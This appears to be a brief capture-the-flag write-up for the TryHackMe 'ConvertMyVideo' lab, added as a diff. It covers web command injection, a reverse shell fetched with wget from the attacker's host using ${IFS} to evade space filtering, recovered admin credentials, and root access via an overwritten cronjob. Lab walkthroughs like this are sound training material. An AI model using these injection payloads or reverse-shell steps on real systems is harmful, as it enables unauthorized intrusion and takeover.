@@ -1,0 +1,31 @@
+10.10.124.236 | convery my video | tryhackme
+
+open ports:
+-----------
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+
+visiting the website at port 80 and saw an input field 
+ran it through burp suite and found out we have command execution
+start a python simple httpserver and send a reverse shell 
+grab it through burp with
+
+wget${IFS}http://10.8.179.136:1234/rev.sh
+${IFS} is a replacement for an empty space 
+
+chmod${IFS}777${IFS}rev.sh
+
+bash${IFS}rev.sh
+
+now we have a reverse shell
+set tty and term variable 
+
+grab the user flag
+cd admin and found credentials  
+itsmeadmin : $apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
+itsmeadmin : jessie
+
+ran pspy64 and found a cronjob running 
+
+overwrite the cronjob clean.sh with a reverse shell and we are root 
+
